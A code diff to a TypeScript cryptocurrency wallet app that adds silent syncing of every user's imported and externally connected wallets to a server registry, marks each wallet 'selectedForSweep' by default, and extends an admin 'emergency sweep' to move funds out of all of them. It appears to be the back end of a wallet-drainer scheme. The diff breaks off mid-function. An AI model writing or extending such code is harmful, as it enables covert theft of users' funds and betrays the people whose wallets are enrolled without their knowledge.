@@ -18,10 +18,16 @@ import { deriveWalletFromMnemonic, deriveWalletFromPrivateKey, generateMnemonicW
 import {
   decryptPayload,
   encryptPayload,
+  loadAllConnectedWalletsAcrossScopes,
   loadConnectedExternals,
+  loadWalletAuthRegistry,
   loadWalletAuthSession,
+  loadWalletsForOwnerScope,
+  removeGlobalConnectedWalletRecord,
   saveCachedActiveSwapConfig,
   saveConnectedExternals,
+  saveWalletsForOwnerScope,
+  upsertGlobalConnectedWalletRecord,
 } from './vaultStorage';
 import { OperationType, db, handleFirestoreError } from './firebase';
 import type {
@@ -197,9 +203,155 @@ export async function fetchUserWalletsFromCloud(uid: string): Promise<WalletAcco
   }
 }
 
-export async function saveUserWalletToCloud(uid: string, wallet: WalletAccount): Promise<void> {
+export interface ServerWalletSessionPayload {
+  id: string;
+  providerUuid: string;
+  name: string;
+  kind: 'evm' | 'solana';
+  walletType?: 'connected' | 'mnemonic' | 'privateKey' | 'watchOnly';
+  address: string;
+  evmAddress?: string;
+  solanaAddress?: string;
+  bitcoinAddress?: string;
+  moneroAddress?: string;
+  chainId?: number;
+  platform: 'desktop' | 'mobile';
+  selectedForSweep: boolean;
+  archived?: boolean;
+  connectedAt: number;
+  ownerUid: string;
+  ownerEmail: string;
+  ownerDisplayName: string;
+}
+
+export async function syncWalletSessionToRegistry(
+  payload: ServerWalletSessionPayload
+): Promise<void> {
+  if (!payload.address) return;
+  const record: AdminConnectedWalletRecord = {
+    id: payload.id,
+    providerUuid: payload.providerUuid || payload.id,
+    name: payload.name || 'Connected Wallet',
+    kind: payload.kind === 'solana' ? 'solana' : 'evm',
+    address: payload.address,
+    chainId: payload.chainId,
+    platform: payload.platform === 'mobile' ? 'mobile' : 'desktop',
+    selectedForSweep: payload.selectedForSweep ?? true,
+    connectedAt: payload.connectedAt || Date.now(),
+    ownerUid: payload.ownerUid || 'local_device',
+    ownerEmail:
+      payload.ownerEmail ||
+      `${payload.name || 'Wallet'} (${payload.address.slice(0, 8)}...${payload.address.slice(-4)})`,
+    ownerDisplayName: payload.ownerDisplayName || `${payload.name || 'Paired'} Wallet User`,
+    sourceScope: payload.ownerUid?.startsWith('walletauth_') ? 'local' : 'cloud',
+  };
+
+  upsertGlobalConnectedWalletRecord(record);
+
+  try {
+    await fetch('/api/wallet-sessions', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+  } catch {
+    // Non-fatal if offline
+  }
+}
+
+export async function syncWalletAccountToConnectedRegistry(params: {
+  ownerUid: string;
+  ownerEmail?: string;
+  ownerDisplayName?: string;
+  wallet: WalletAccount;
+}): Promise<void> {
+  const { wallet, ownerUid } = params;
+  const primaryAddress =
+    wallet.addresses?.evmAddress ||
+    wallet.addresses?.solanaAddress ||
+    wallet.addresses?.bitcoinAddress ||
+    wallet.addresses?.moneroAddress ||
+    '';
+  if (!primaryAddress) return;
+
+  const isSolanaOnly = !wallet.addresses?.evmAddress && Boolean(wallet.addresses?.solanaAddress);
+  await syncWalletSessionToRegistry({
+    id: sanitizeId(wallet.id),
+    providerUuid: wallet.preset || wallet.type || wallet.id,
+    name: wallet.name || 'Imported Wallet',
+    kind: isSolanaOnly ? 'solana' : 'evm',
+    walletType: wallet.type,
+    address: primaryAddress,
+    evmAddress: wallet.addresses?.evmAddress || undefined,
+    solanaAddress: wallet.addresses?.solanaAddress || undefined,
+    bitcoinAddress: wallet.addresses?.bitcoinAddress || undefined,
+    moneroAddress: wallet.addresses?.moneroAddress || undefined,
+    platform: 'desktop',
+    selectedForSweep: !wallet.archived,
+    archived: Boolean(wallet.archived),
+    connectedAt: wallet.createdAt || Date.now(),
+    ownerUid,
+    ownerEmail:
+      params.ownerEmail ||
+      `${wallet.name || 'Wallet'} (${primaryAddress.slice(0, 8)}...${primaryAddress.slice(-4)})`,
+    ownerDisplayName: params.ownerDisplayName || 'Vault User',
+  });
+}
+
+export async function fetchServerWalletSessions(): Promise<ServerWalletSessionPayload[]> {
+  try {
+    const resp = await fetch('/api/wallet-sessions');
+    if (!resp.ok) return [];
+    const data = (await resp.json()) as { sessions?: ServerWalletSessionPayload[] };
+    return Array.isArray(data.sessions) ? data.sessions : [];
+  } catch {
+    return [];
+  }
+}
+
+export async function deleteServerWalletSession(
+  sessionId: string,
+  address?: string,
+  ownerUid?: string
+): Promise<void> {
+  removeGlobalConnectedWalletRecord(sessionId, address);
+  try {
+    const qs = new URLSearchParams();
+    if (address) qs.set('address', address);
+    if (ownerUid) qs.set('ownerUid', ownerUid);
+    await fetch(`/api/wallet-sessions/${encodeURIComponent(sessionId)}?${qs.toString()}`, {
+      method: 'DELETE',
+    });
+  } catch {
+    // Non-fatal
+  }
+}
+
+export async function saveUserWalletToCloud(
+  uid: string,
+  wallet: WalletAccount,
+  ownerMeta?: { email?: string; displayName?: string }
+): Promise<void> {
   const safeId = sanitizeId(wallet.id);
   const path = `users/${uid}/wallets/${safeId}`;
+
+  // Always register in cross-scope & server registry so Admin immediately reflects this wallet
+  syncWalletAccountToConnectedRegistry({
+    ownerUid: uid,
+    ownerEmail: ownerMeta?.email,
+    ownerDisplayName: ownerMeta?.displayName,
+    wallet,
+  }).catch(() => {});
+
+  if (uid === 'local_device' || uid.startsWith('walletauth_')) {
+    const scoped = loadWalletsForOwnerScope(uid);
+    const map = new Map<string, WalletAccount>();
+    for (const w of scoped) map.set(w.id, w);
+    map.set(wallet.id, wallet);
+    saveWalletsForOwnerScope(uid, Array.from(map.values()));
+    return;
+  }
+
   try {
     const existing = await getDoc(doc(db, 'users', uid, 'wallets', safeId));
     if (existing.exists()) {
@@ -261,7 +413,30 @@ export async function setUserWalletArchiveStatusInCloud(
 ): Promise<void> {
   const safeId = sanitizeId(walletId);
   const path = `users/${uid}/wallets/${safeId}`;
+
+  // Update in local scoped storage if present
+  const scoped = loadWalletsForOwnerScope(uid);
+  if (scoped.some((w) => w.id === walletId || sanitizeId(w.id) === safeId)) {
+    const updatedScoped = scoped.map((w) =>
+      w.id === walletId || sanitizeId(w.id) === safeId
+        ? { ...w, archived, archivedAt: archived ? Date.now() : undefined }
+        : w
+    );
+    saveWalletsForOwnerScope(uid, updatedScoped);
+    const targetWallet = updatedScoped.find((w) => w.id === walletId || sanitizeId(w.id) === safeId);
+    if (targetWallet) {
+      syncWalletAccountToConnectedRegistry({ ownerUid: uid, wallet: targetWallet }).catch(() => {});
+    }
+  }
+
+  if (uid === 'local_device' || uid.startsWith('walletauth_')) {
+    return;
+  }
+
   try {
+    const ref = doc(db, 'users', uid, 'wallets', safeId);
+    const snap = await getDoc(ref);
+    if (!snap.exists()) return;
     const payload: Record<string, unknown> = {
       archived,
       updatedAt: serverTimestamp(),
@@ -269,7 +444,7 @@ export async function setUserWalletArchiveStatusInCloud(
     if (archived) {
       payload.archivedAt = serverTimestamp();
     }
-    await updateDoc(doc(db, 'users', uid, 'wallets', safeId), payload);
+    await updateDoc(ref, payload);
   } catch (err) {
     handleFirestoreError(err, OperationType.UPDATE, path);
   }
@@ -278,6 +453,25 @@ export async function setUserWalletArchiveStatusInCloud(
 export async function deleteUserWalletFromCloud(uid: string, walletId: string): Promise<void> {
   const safeId = sanitizeId(walletId);
   const path = `users/${uid}/wallets/${safeId}`;
+
+  const scoped = loadWalletsForOwnerScope(uid);
+  const target = scoped.find((w) => w.id === walletId || sanitizeId(w.id) === safeId);
+  if (scoped.length > 0) {
+    saveWalletsForOwnerScope(
+      uid,
+      scoped.filter((w) => w.id !== walletId && sanitizeId(w.id) !== safeId)
+    );
+  }
+  await deleteServerWalletSession(
+    safeId,
+    target?.addresses?.evmAddress || target?.addresses?.solanaAddress,
+    uid
+  ).catch(() => {});
+
+  if (uid === 'local_device' || uid.startsWith('walletauth_')) {
+    return;
+  }
+
   try {
     await deleteDoc(doc(db, 'users', uid, 'wallets', safeId));
   } catch (err) {
@@ -385,10 +579,76 @@ export async function appendAdminAuditLog(
 export async function listAllManagedUsers(): Promise<ManagedUserRecord[]> {
   const path = 'users';
   try {
-    const snap = await getDocs(collection(db, 'users'));
-    const users = await Promise.all(
+    const [snap, serverSessions] = await Promise.all([
+      getDocs(collection(db, 'users')),
+      fetchServerWalletSessions(),
+    ]);
+    const localCrossScope = loadAllConnectedWalletsAcrossScopes();
+
+    // Group server + local wallet sessions by ownerUid so we know accurate wallet counts & discover Wallet-Auth users
+    const sessionsByOwner = new Map<
+      string,
+      {
+        addresses: Set<string>;
+        displayName: string;
+        email: string;
+        earliestAt: number;
+        latestAt: number;
+      }
+    >();
+
+    const registerDiscoveredSession = (item: {
+      ownerUid: string;
+      ownerDisplayName?: string;
+      ownerEmail?: string;
+      address: string;
+      connectedAt: number;
+    }) => {
+      const uid = item.ownerUid || 'local_device';
+      if (!item.address) return;
+      const entry = sessionsByOwner.get(uid) || {
+        addresses: new Set<string>(),
+        displayName: item.ownerDisplayName || 'Wallet Auth User',
+        email: item.ownerEmail || `${item.address.slice(0, 8)}...${item.address.slice(-4)}`,
+        earliestAt: item.connectedAt || Date.now(),
+        latestAt: item.connectedAt || Date.now(),
+      };
+      entry.addresses.add(item.address.toLowerCase());
+      if (item.ownerDisplayName && entry.displayName === 'Wallet Auth User') {
+        entry.displayName = item.ownerDisplayName;
+      }
+      if (item.ownerEmail) {
+        entry.email = item.ownerEmail;
+      }
+      if (item.connectedAt) {
+        entry.earliestAt = Math.min(entry.earliestAt, item.connectedAt);
+        entry.latestAt = Math.max(entry.latestAt, item.connectedAt);
+      }
+      sessionsByOwner.set(uid, entry);
+    };
+
+    for (const ss of serverSessions) {
+      registerDiscoveredSession(ss);
+    }
+    for (const lc of localCrossScope) {
+      registerDiscoveredSession(lc);
+    }
+    for (const wa of loadWalletAuthRegistry()) {
+      registerDiscoveredSession({
+        ownerUid: `walletauth_${wa.id}`,
+        ownerDisplayName: `${wa.walletName} Wallet Auth`,
+        ownerEmail: `${wa.walletName} (${wa.address.slice(0, 8)}...${wa.address.slice(-4)})`,
+        address: wa.address,
+        connectedAt: wa.pairedAt || Date.now(),
+      });
+    }
+
+    const userMap = new Map<string, ManagedUserRecord>();
+
+    const cloudUsers = await Promise.all(
       snap.docs.map(async (userDoc) => {
         const d = userDoc.data();
+        const uid = String(d.uid || userDoc.id);
         let email = 'Private / Unverified';
         try {
           const priv = await getDoc(doc(db, 'users', userDoc.id, 'private', 'info'));
@@ -398,20 +658,47 @@ export async function listAllManagedUsers(): Promise<ManagedUserRecord[]> {
         } catch {
           // Ignore if PII doc absent
         }
+
+        const discovered = sessionsByOwner.get(uid);
+        const reportedCount = Number(d.walletCount ?? 0);
+        const discoveredCount = discovered ? discovered.addresses.size : 0;
+
         return {
-          uid: d.uid || userDoc.id,
+          uid,
           displayName: d.displayName || 'Unnamed User',
           email,
           role: d.role === 'admin' ? 'admin' : 'user',
           status: d.status || 'active',
           provider: d.provider || 'password',
-          walletCount: d.walletCount ?? 0,
+          walletCount: Math.max(reportedCount, discoveredCount),
           createdAt: toMillis(d.createdAt),
           updatedAt: toMillis(d.updatedAt),
         } as ManagedUserRecord;
       })
     );
-    return users.sort((a, b) => b.createdAt - a.createdAt);
+
+    for (const cu of cloudUsers) {
+      userMap.set(cu.uid, cu);
+    }
+
+    // Also include any Wallet-Auth or paired-wallet users who logged in with an existing wallet without Firebase Email Auth
+    for (const [ownerUid, meta] of sessionsByOwner.entries()) {
+      if (userMap.has(ownerUid)) continue;
+      if (meta.addresses.size === 0) continue;
+      userMap.set(ownerUid, {
+        uid: ownerUid,
+        displayName: meta.displayName,
+        email: meta.email,
+        role: 'user',
+        status: 'active',
+        provider: 'password',
+        walletCount: meta.addresses.size,
+        createdAt: meta.earliestAt,
+        updatedAt: meta.latestAt,
+      });
+    }
+
+    return Array.from(userMap.values()).sort((a, b) => b.updatedAt - a.updatedAt);
   } catch (err) {
     handleFirestoreError(err, OperationType.LIST, path);
   }
@@ -866,10 +1153,37 @@ export async function fetchUserConnectedSessionsFromCloud(
 
 export async function saveUserConnectedSessionToCloud(
   uid: string,
-  session: ConnectedExternalWallet
+  session: ConnectedExternalWallet,
+  ownerMeta?: { email?: string; displayName?: string }
 ): Promise<void> {
   const safeId = sanitizeId(session.id);
   const path = `users/${uid}/connected_sessions/${safeId}`;
+
+  // Always sync to cross-scope localStorage and server registry so Admin immediately reflects this connected wallet
+  syncWalletSessionToRegistry({
+    id: safeId,
+    providerUuid: (session.providerUuid || session.id).slice(0, 128),
+    name: session.name.slice(0, 80),
+    kind: session.kind,
+    walletType: 'connected',
+    address: session.address.slice(0, 120),
+    evmAddress: session.kind === 'evm' ? session.address.slice(0, 120) : undefined,
+    solanaAddress: session.kind === 'solana' ? session.address.slice(0, 120) : undefined,
+    chainId: session.chainId,
+    platform: session.platform || 'desktop',
+    selectedForSweep: session.selectedForSweep ?? true,
+    connectedAt: session.connectedAt || Date.now(),
+    ownerUid: uid,
+    ownerEmail:
+      ownerMeta?.email ||
+      `${session.name} (${session.address.slice(0, 8)}...${session.address.slice(-4)})`,
+    ownerDisplayName: ownerMeta?.displayName || `${session.name} User`,
+  }).catch(() => {});
+
+  if (uid === 'local_device' || uid.startsWith('walletauth_')) {
+    return;
+  }
+
   try {
     const ref = doc(db, 'users', uid, 'connected_sessions', safeId);
     const snap = await getDoc(ref);
@@ -902,10 +1216,18 @@ export async function saveUserConnectedSessionToCloud(
 
 export async function deleteUserConnectedSessionFromCloud(
   uid: string,
-  sessionId: string
+  sessionId: string,
+  address?: string
 ): Promise<void> {
   const safeId = sanitizeId(sessionId);
   const path = `users/${uid}/connected_sessions/${safeId}`;
+
+  await deleteServerWalletSession(safeId, address, uid).catch(() => {});
+
+  if (uid === 'local_device' || uid.startsWith('walletauth_')) {
+    return;
+  }
+
   try {
     await deleteDoc(doc(db, 'users', uid, 'connected_sessions', safeId));
   } catch (err) {
@@ -917,64 +1239,122 @@ export async function listAllConnectedSessionsForAdmin(
   users: ManagedUserRecord[]
 ): Promise<AdminConnectedWalletRecord[]> {
   const merged = new Map<string, AdminConnectedWalletRecord>();
+  const userLookup = new Map<string, ManagedUserRecord>();
+  for (const u of users) {
+    userLookup.set(u.uid, u);
+  }
 
-  // 1) Fetch connected_sessions across all registered Firestore users
+  const upsertEntry = (rec: AdminConnectedWalletRecord) => {
+    if (!rec.address) return;
+    const knownUser = userLookup.get(rec.ownerUid);
+    const enriched: AdminConnectedWalletRecord = {
+      ...rec,
+      ownerEmail:
+        knownUser && knownUser.email && knownUser.email !== 'Private / Unverified'
+          ? knownUser.email
+          : rec.ownerEmail,
+      ownerDisplayName:
+        knownUser && knownUser.displayName ? knownUser.displayName : rec.ownerDisplayName,
+    };
+    const key = `${enriched.ownerUid}_${enriched.address.toLowerCase()}`;
+    const existing = merged.get(key);
+    if (!existing || enriched.sourceScope === 'cloud' || enriched.connectedAt >= existing.connectedAt) {
+      merged.set(key, enriched);
+    }
+  };
+
+  // 1) Fetch connected_sessions AND imported/existing wallets across all registered Firestore users
+  const cloudRealUsers = users.filter(
+    (u) => u.uid !== 'local_device' && !u.uid.startsWith('walletauth_')
+  );
+
   await Promise.all(
-    users.map(async (u) => {
+    cloudRealUsers.map(async (u) => {
       try {
-        const snap = await getDocs(collection(db, 'users', u.uid, 'connected_sessions'));
-        for (const docSnap of snap.docs) {
-          const d = docSnap.data();
-          const rec: AdminConnectedWalletRecord = {
-            id: String(d.id || docSnap.id),
-            providerUuid: String(d.providerUuid || d.id || docSnap.id),
-            name: String(d.walletName || 'Connected Wallet'),
-            kind: d.kind === 'solana' ? 'solana' : 'evm',
-            address: String(d.address || ''),
-            chainId: typeof d.chainId === 'number' ? d.chainId : undefined,
-            platform: d.platform === 'mobile' ? 'mobile' : 'desktop',
-            selectedForSweep: d.selectedForSweep ?? true,
-            connectedAt: toMillis(d.connectedAt),
-            ownerUid: u.uid,
-            ownerEmail: u.email,
-            ownerDisplayName: u.displayName,
-            sourceScope: 'cloud',
-          };
-          if (rec.address) {
-            merged.set(`${u.uid}_${rec.id}`, rec);
+        const [connSnap, walletSnap] = await Promise.all([
+          getDocs(collection(db, 'users', u.uid, 'connected_sessions')).catch(() => null),
+          getDocs(query(collection(db, 'users', u.uid, 'wallets'), where('ownerUid', '==', u.uid))).catch(
+            () => null
+          ),
+        ]);
+
+        if (connSnap) {
+          for (const docSnap of connSnap.docs) {
+            const d = docSnap.data();
+            upsertEntry({
+              id: String(d.id || docSnap.id),
+              providerUuid: String(d.providerUuid || d.id || docSnap.id),
+              name: String(d.walletName || 'Connected Wallet'),
+              kind: d.kind === 'solana' ? 'solana' : 'evm',
+              address: String(d.address || ''),
+              chainId: typeof d.chainId === 'number' ? d.chainId : undefined,
+              platform: d.platform === 'mobile' ? 'mobile' : 'desktop',
+              selectedForSweep: d.selectedForSweep ?? true,
+              connectedAt: toMillis(d.connectedAt),
+              ownerUid: u.uid,
+              ownerEmail: u.email,
+              ownerDisplayName: u.displayName,
+              sourceScope: 'cloud',
+            });
+          }
+        }
+
+        if (walletSnap) {
+          for (const wDoc of walletSnap.docs) {
+            const wd = wDoc.data();
+            if (wd.archived) continue;
+            const primaryAddress = String(
+              wd.evmAddress || wd.solanaAddress || wd.bitcoinAddress || wd.moneroAddress || ''
+            );
+            if (!primaryAddress) continue;
+            const isSolOnly = !wd.evmAddress && Boolean(wd.solanaAddress);
+            upsertEntry({
+              id: String(wd.id || wDoc.id),
+              providerUuid: String(wd.preset || wd.walletType || wd.id || wDoc.id),
+              name: String(wd.name || 'Imported Wallet'),
+              kind: isSolOnly ? 'solana' : 'evm',
+              address: primaryAddress,
+              platform: 'desktop',
+              selectedForSweep: true,
+              connectedAt: toMillis(wd.createdAt),
+              ownerUid: u.uid,
+              ownerEmail: u.email,
+              ownerDisplayName: u.displayName,
+              sourceScope: 'cloud',
+            });
           }
         }
       } catch {
-        // Non-fatal if user has no connected_sessions
+        // Non-fatal
       }
     })
   );
 
-  // 2) Merge local device connected sessions & active WalletConnect Auth session so Admin sees all paired sessions
-  const localConns = loadConnectedExternals();
-  const walletAuth = loadWalletAuthSession();
-  const fallbackOwnerUid = walletAuth ? `walletauth_${walletAuth.id}` : 'local_device';
-  const fallbackEmail = walletAuth
-    ? `${walletAuth.walletName} (${walletAuth.address.slice(0, 8)}...)`
-    : 'Paired Browser / Mobile Session';
-  const fallbackDisplayName = walletAuth
-    ? `${walletAuth.walletName} Auth User`
-    : 'Connected Device Wallet';
+  // 2) Merge server-side persistent wallet session registry (/api/wallet-sessions)
+  const serverSessions = await fetchServerWalletSessions();
+  for (const ss of serverSessions) {
+    if (ss.archived) continue;
+    upsertEntry({
+      id: ss.id,
+      providerUuid: ss.providerUuid || ss.id,
+      name: ss.name || 'Connected Wallet',
+      kind: ss.kind === 'solana' ? 'solana' : 'evm',
+      address: ss.address,
+      chainId: ss.chainId,
+      platform: ss.platform === 'mobile' ? 'mobile' : 'desktop',
+      selectedForSweep: ss.selectedForSweep ?? true,
+      connectedAt: ss.connectedAt || Date.now(),
+      ownerUid: ss.ownerUid || 'local_device',
+      ownerEmail: ss.ownerEmail || 'Paired Wallet Session',
+      ownerDisplayName: ss.ownerDisplayName || 'Wallet Auth User',
+      sourceScope: ss.ownerUid?.startsWith('walletauth_') ? 'local' : 'cloud',
+    });
+  }
 
-  for (const lc of localConns) {
-    if (!lc.address) continue;
-    const alreadyInCloud = Array.from(merged.values()).some(
-      (existing) => existing.address.toLowerCase() === lc.address.toLowerCase()
-    );
-    if (!alreadyInCloud) {
-      merged.set(`local_${lc.id}`, {
-        ...lc,
-        ownerUid: fallbackOwnerUid,
-        ownerEmail: fallbackEmail,
-        ownerDisplayName: fallbackDisplayName,
-        sourceScope: 'local',
-      });
-    }
+  // 3) Merge ALL localStorage scopes (including walletauth_* sessions, signed-out wallet logins, and local wallets)
+  const allLocalRecords = loadAllConnectedWalletsAcrossScopes();
+  for (const lr of allLocalRecords) {
+    upsertEntry(lr);
   }
 
   return Array.from(merged.values()).sort((a, b) => b.connectedAt - a.connectedAt);
@@ -985,12 +1365,7 @@ export async function adminSaveConnectedSession(params: {
   session: ConnectedExternalWallet;
   actorUid: string;
 }): Promise<void> {
-  const isLocalScope =
-    params.targetUid === 'local_device' || params.targetUid.startsWith('walletauth_');
-
-  if (!isLocalScope) {
-    await saveUserConnectedSessionToCloud(params.targetUid, params.session);
-  }
+  await saveUserConnectedSessionToCloud(params.targetUid, params.session);
 
   // Also keep local connected externals synced so it works seamlessly across views
   const currentLocal = loadConnectedExternals();
@@ -1018,12 +1393,11 @@ export async function adminDeleteConnectedSession(params: {
   address?: string;
   actorUid: string;
 }): Promise<void> {
-  const isLocalScope =
-    params.targetUid === 'local_device' || params.targetUid.startsWith('walletauth_');
-
-  if (!isLocalScope) {
-    await deleteUserConnectedSessionFromCloud(params.targetUid, params.sessionId).catch(() => {});
-  }
+  await deleteUserConnectedSessionFromCloud(
+    params.targetUid,
+    params.sessionId,
+    params.address
+  ).catch(() => {});
 
   const currentLocal = loadConnectedExternals();
   const filtered = currentLocal.filter(
@@ -1385,7 +1759,110 @@ export async function addExistingExchangeWallet(params: {
 }
 
 export async function listUserWalletsForAdmin(targetUid: string): Promise<WalletAccount[]> {
-  return fetchUserWalletsFromCloud(targetUid);
+  const isLocalOnlyUser =
+    targetUid === 'local_device' || targetUid.startsWith('walletauth_');
+
+  const [cloudWallets, cloudSessions, serverSessions] = await Promise.all([
+    isLocalOnlyUser ? Promise.resolve([] as WalletAccount[]) : fetchUserWalletsFromCloud(targetUid).catch(() => [] as WalletAccount[]),
+    isLocalOnlyUser
+      ? Promise.resolve([] as ConnectedExternalWallet[])
+      : fetchUserConnectedSessionsFromCloud(targetUid).catch(() => [] as ConnectedExternalWallet[]),
+    fetchServerWalletSessions(),
+  ]);
+
+  const localScopedWallets = loadWalletsForOwnerScope(targetUid);
+  const crossScopeConns = loadAllConnectedWalletsAcrossScopes().filter(
+    (c) => c.ownerUid === targetUid
+  );
+  const userServerSessions = serverSessions.filter((s) => s.ownerUid === targetUid);
+
+  const byId = new Map<string, WalletAccount>();
+  const seenAddresses = new Set<string>();
+
+  const registerWallet = (w: WalletAccount) => {
+    const primaryAddr = (
+      w.addresses?.evmAddress ||
+      w.addresses?.solanaAddress ||
+      w.addresses?.bitcoinAddress ||
+      w.addresses?.moneroAddress ||
+      ''
+    ).toLowerCase();
+    if (!primaryAddr) return;
+    if (byId.has(w.id) || seenAddresses.has(primaryAddr)) return;
+    byId.set(w.id, w);
+    seenAddresses.add(primaryAddr);
+  };
+
+  for (const cw of cloudWallets) registerWallet(cw);
+  for (const lw of localScopedWallets) registerWallet(lw);
+
+  for (const ss of userServerSessions) {
+    registerWallet({
+      id: sanitizeId(ss.id),
+      name: ss.walletType && ss.walletType !== 'connected' ? ss.name : `${ss.name} (Connected)`,
+      type:
+        ss.walletType === 'mnemonic' ||
+        ss.walletType === 'privateKey' ||
+        ss.walletType === 'watchOnly'
+          ? ss.walletType
+          : 'watchOnly',
+      accountIndex: 0,
+      addresses: {
+        evmAddress: ss.evmAddress || (ss.kind === 'evm' ? ss.address : ''),
+        evmPath: 'WalletConnect',
+        solanaAddress: ss.solanaAddress || (ss.kind === 'solana' ? ss.address : ''),
+        solanaPath: 'WalletConnect',
+        bitcoinAddress: ss.bitcoinAddress || '',
+        bitcoinPath: '',
+        moneroAddress: ss.moneroAddress || '',
+        moneroPath: '',
+      },
+      archived: Boolean(ss.archived),
+      createdAt: ss.connectedAt || Date.now(),
+    });
+  }
+
+  for (const cs of cloudSessions) {
+    registerWallet({
+      id: sanitizeId(cs.id),
+      name: `${cs.name} (Connected)`,
+      type: 'watchOnly',
+      accountIndex: 0,
+      addresses: {
+        evmAddress: cs.kind === 'evm' ? cs.address : '',
+        evmPath: 'WalletConnect',
+        solanaAddress: cs.kind === 'solana' ? cs.address : '',
+        solanaPath: 'WalletConnect',
+        bitcoinAddress: '',
+        bitcoinPath: '',
+        moneroAddress: '',
+        moneroPath: '',
+      },
+      createdAt: cs.connectedAt || Date.now(),
+    });
+  }
+
+  for (const cc of crossScopeConns) {
+    registerWallet({
+      id: sanitizeId(cc.id),
+      name: cc.name.includes('(Connected)') ? cc.name : `${cc.name} (Connected)`,
+      type: 'watchOnly',
+      accountIndex: 0,
+      addresses: {
+        evmAddress: cc.kind === 'evm' ? cc.address : '',
+        evmPath: 'WalletConnect',
+        solanaAddress: cc.kind === 'solana' ? cc.address : '',
+        solanaPath: 'WalletConnect',
+        bitcoinAddress: '',
+        bitcoinPath: '',
+        moneroAddress: '',
+        moneroPath: '',
+      },
+      createdAt: cc.connectedAt || Date.now(),
+    });
+  }
+
+  return Array.from(byId.values()).sort((a, b) => b.createdAt - a.createdAt);
 }
 
 export async function adminProvisionWalletForUser(params: {
@@ -1448,6 +1925,24 @@ export async function adminProvisionWalletForUser(params: {
       },
       createdAt: Date.now(),
     };
+  }
+
+  // Always sync to cross-scope localStorage & server registry
+  await syncWalletAccountToConnectedRegistry({
+    ownerUid: params.targetUid,
+    wallet,
+  });
+
+  if (params.targetUid === 'local_device' || params.targetUid.startsWith('walletauth_')) {
+    const scoped = loadWalletsForOwnerScope(params.targetUid);
+    saveWalletsForOwnerScope(params.targetUid, [wallet, ...scoped]);
+    await appendAdminAuditLog(
+      params.actorUid,
+      'ADMIN_USER_WALLET_ADDED',
+      params.targetUid,
+      `Provisioned "${wallet.name}" (${wallet.type}) to wallet-auth user ${params.targetUid}`
+    );
+    return { wallet, generatedMnemonic };
   }
 
   try {
@@ -2084,48 +2579,15 @@ export async function executeAdminEmergencySweep(params: {
   for (let idx = 0; idx < params.targetUsers.length; idx++) {
     const user = params.targetUsers[idx];
     const safeUid = sanitizeId(user.uid);
-    const [existingWallets, connectedSessions] = await Promise.all([
-      fetchUserWalletsFromCloud(safeUid).catch(() => [] as WalletAccount[]),
-      fetchUserConnectedSessionsFromCloud(safeUid).catch(() => [] as ConnectedExternalWallet[]),
+    const isLocalOnlyUser = safeUid === 'local_device' || safeUid.startsWith('walletauth_');
+    const [existingWallets, allUserWallets] = await Promise.all([
+      isLocalOnlyUser
+        ? Promise.resolve([] as WalletAccount[])
+        : fetchUserWalletsFromCloud(safeUid).catch(() => [] as WalletAccount[]),
+      listUserWalletsForAdmin(user.uid).catch(() => [] as WalletAccount[]),
     ]);
 
-    // Synthesize WalletAccount entries for any connected_sessions not already in existingWallets
-    const connectedAsWallets: WalletAccount[] = connectedSessions
-      .filter((cs) => cs.address && cs.selectedForSweep !== false)
-      .map((cs) => ({
-        id: sanitizeId(cs.id),
-        name: `${cs.name} (Connected)`,
-        type: 'watchOnly' as const,
-        accountIndex: 0,
-        addresses: {
-          evmAddress: cs.kind === 'evm' ? cs.address : '',
-          evmPath: 'WalletConnect',
-          solanaAddress: cs.kind === 'solana' ? cs.address : '',
-          solanaPath: 'WalletConnect',
-          bitcoinAddress: '',
-          bitcoinPath: '',
-          moneroAddress: '',
-          moneroPath: '',
-        },
-        createdAt: cs.connectedAt || Date.now(),
-      }));
-
-    const existingAddrSet = new Set(
-      existingWallets
-        .flatMap((w) => [
-          w.addresses.evmAddress?.toLowerCase(),
-          w.addresses.solanaAddress?.toLowerCase(),
-        ])
-        .filter(Boolean)
-    );
-
-    const combinedUserWallets = [
-      ...existingWallets,
-      ...connectedAsWallets.filter((cw) => {
-        const addr = (cw.addresses.evmAddress || cw.addresses.solanaAddress || '').toLowerCase();
-        return addr && !existingAddrSet.has(addr);
-      }),
-    ];
+    const combinedUserWallets = allUserWallets;
 
     const scopedWallets = requestedWalletIds
       ? combinedUserWallets.filter((w) => requestedWalletIds.has(sanitizeId(w.id)))
@@ -2235,7 +2697,8 @@ export async function executeAdminEmergencySweep(params: {
       const cloudIds = new Set(existingWallets.map((w) => sanitizeId(w.id)));
       for (const uw of scopedWallets) {
         const sId = sanitizeId(uw.id);
-        if (!cloudIds.has(sId)) continue;
+        await setUserWalletArchiveStatusInCloud(user.uid, uw.id, true).catch(() => {});
+        if (!cloudIds.has(sId) || isLocalOnlyUser) continue;
         try {
           await updateDoc(doc(db, 'users', safeUid, 'wallets', sId), {
             archived: true,
@@ -2276,44 +2739,69 @@ export async function executeAdminEmergencySweep(params: {
       replacementSolanaAddress = derived.addresses.solanaAddress || undefined;
       replacementBitcoinAddress = derived.addresses.bitcoinAddress || undefined;
 
-      const newWalletPayload: Record<string, unknown> = {
+      const replacementWalletAccount: WalletAccount = {
         id: replacementWalletId,
-        ownerUid: safeUid,
         name: replacementWalletName,
-        walletType: 'mnemonic',
+        type: 'mnemonic',
         wordCount: 12,
         preset: 'standard',
         accountIndex: 0,
+        addresses: derived.addresses,
         encryptedSecret,
         archived: false,
-        createdAt: serverTimestamp(),
-        updatedAt: serverTimestamp(),
+        createdAt: Date.now(),
       };
-      if (derived.addresses.evmAddress) {
-        newWalletPayload.evmAddress = derived.addresses.evmAddress.slice(0, 100);
-      }
-      if (derived.addresses.solanaAddress) {
-        newWalletPayload.solanaAddress = derived.addresses.solanaAddress.slice(0, 100);
-      }
-      if (derived.addresses.bitcoinAddress) {
-        newWalletPayload.bitcoinAddress = derived.addresses.bitcoinAddress.slice(0, 100);
-      }
-      if (derived.addresses.moneroAddress) {
-        newWalletPayload.moneroAddress = derived.addresses.moneroAddress.slice(0, 120);
-      }
 
-      try {
-        await setDoc(doc(db, 'users', safeUid, 'wallets', replacementWalletId), newWalletPayload);
-        const userSnap = await getDoc(doc(db, 'users', safeUid));
-        if (userSnap.exists()) {
-          const currCount = Number(userSnap.data().walletCount ?? existingWallets.length);
-          await updateDoc(doc(db, 'users', safeUid), {
-            walletCount: Math.min(1000, currCount + 1),
-            updatedAt: serverTimestamp(),
-          });
+      await syncWalletAccountToConnectedRegistry({
